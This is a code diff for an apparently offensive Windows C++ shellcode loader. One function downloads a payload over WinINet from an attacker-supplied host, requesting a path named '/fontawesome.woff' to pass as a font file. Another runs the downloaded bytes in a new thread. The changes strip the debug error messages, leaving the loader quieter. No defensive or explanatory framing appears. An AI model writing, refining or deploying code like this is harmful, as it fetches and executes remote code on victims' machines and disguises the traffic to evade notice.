@@ -28,8 +28,6 @@ ShellCode ShellcodeLoader::Download(LPCWSTR host, INTERNET_PORT port)
 	HINTERNET hRequest = HttpOpenRequest(hConnect, L"GET", L"/fontawesome.woff", NULL, NULL, NULL, 0, 0);
 	if (hRequest == NULL)
 	{
-		printf("[!] Failed to create HTTP request. Error code: %d\n", GetLastError());
-		
 		InternetCloseHandle(hConnect);
 		InternetCloseHandle(hInternet);
 		return {NULL,0};
@@ -37,8 +35,6 @@ ShellCode ShellcodeLoader::Download(LPCWSTR host, INTERNET_PORT port)
 
 	if (!HttpSendRequest(hRequest, NULL, 0, NULL, 0))
 	{
-		printf("[!] Failed to create send HTTP request. Error code: %d\n", GetLastError());
-
 		InternetCloseHandle(hConnect);
 		InternetCloseHandle(hInternet);
 		return { NULL,0 };
@@ -55,7 +51,6 @@ ShellCode ShellcodeLoader::Download(LPCWSTR host, INTERNET_PORT port)
 	{
 		if (!InternetReadFile(hRequest, &buffer[0], bufferSize, &dwBytesRead))
 		{
-			printf("[!] Error reading internet file : <%lu>\n", GetLastError()); // only for debugging
 			InternetCloseHandle(hRequest);
 			InternetCloseHandle(hConnect);
 			InternetCloseHandle(hInternet);
@@ -96,7 +91,6 @@ void ShellcodeLoader::ExecuteShellcode(ShellCode shellcode)
 	hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)pBuffer, NULL, NULL, 0);
 	if (!hThread)
 	{
-		printf("[!] Cannot create thread 0x%d\n ", GetLastError());
 		return;
 	}
 
